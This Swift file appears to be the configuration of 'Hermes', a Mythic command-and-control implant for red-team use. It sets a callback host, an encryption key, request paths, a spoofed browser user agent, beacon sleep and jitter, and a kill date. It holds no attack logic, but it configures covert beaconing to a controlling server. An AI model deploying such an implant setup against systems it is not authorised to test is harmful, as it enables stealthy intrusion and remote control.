//
//  config.swift
//  Hermes
//
//  Created by slyd0g on 5/23/21.
//

import Foundation

struct AgentConfig {
    // Mythic components
    var payloadUUID: String
    var encodedAESKey: String
    
    // C2 components
    var callbackHost: String
    var getRequestURI: String
    var postRequestURI: String
    var callbackPort: Int
    var userAgent: String
    var hostHeader: String
    var useSSL: Bool
    var queryParameter: String
    var httpHeaders: Dictionary<String,String>
    
    // Agent components
    var sleep: Int32
    var jitter: Int32
    var killDate: String //year-month-day, ex. 1994-01-05
}

var agentConfig = AgentConfig(
    payloadUUID: "86884592-40e0-413f-aee9-a93accd8bb96",
    encodedAESKey: "8SNeOPWj3Q384MRJZ+M0PlZ0Q1dq1X6unNbdRRextzg=",
    
    callbackHost: "redirector-test.polarbear.dev",
    getRequestURI: "/get",
    postRequestURI: "/post",
    callbackPort: 443,
    userAgent: "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
    hostHeader: "",
    useSSL: true,
    queryParameter: "q",
    httpHeaders: ["Authorization":"SnowflakeRedTeam"],
    
    sleep: 10,
    jitter: 23,
    killDate: "2025-02-05"
)
